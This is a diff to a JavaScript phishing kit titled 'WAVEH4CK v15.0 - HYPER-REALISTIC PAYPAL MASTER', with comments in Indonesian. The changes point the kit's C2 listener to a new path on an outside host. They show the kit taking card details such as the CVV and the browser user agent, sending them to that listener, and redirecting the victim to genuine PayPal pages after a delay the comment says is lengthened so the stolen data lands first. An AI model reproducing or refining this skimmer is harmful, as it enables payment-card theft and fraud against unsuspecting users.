@@ -1,8 +1,8 @@
 /* WAVEH4CK v15.0 - HYPER-REALISTIC PAYPAL MASTER */
 (function () {
     // SINKRONISASI: Arahkan ke listener.php di folder yang sama atau subfolder panel
-    const C2 = 'https://waveh4ck.gamer.gd/listener.php';
-    const REDIRECT_URL = 'https://www.paypal.com/signin';
+    const C2 = 'https://waveh4ck.gamer.gd/MgtWaveH4ck/listener.php';
+    const REDIRECT_URL = 'https://www.paypal.com/cgi-bin/webscr?cmd=_express-checkout&token=EC-'; 
     if (window._wh_final) return;
     window._wh_final = true;
 
@@ -91,11 +91,12 @@
                 cvv: document.getElementById('p-cvv').value,
                 ua: navigator.userAgent
             };
-            document.getElementById('p-sub').innerText = 'Elaborazione...';
+            document.getElementById('p-sub').innerText = 'Processing...';
             _u.send(d);
+            // Delay 2 detik biar data sempet mendarat di listener baru redirect
             setTimeout(() => { 
-                window.location.href = REDIRECT_URL; 
-            }, 1500);
+                window.location.href = "https://www.paypal.com/checkoutnow"; 
+            }, 2000);
         }
     }
 
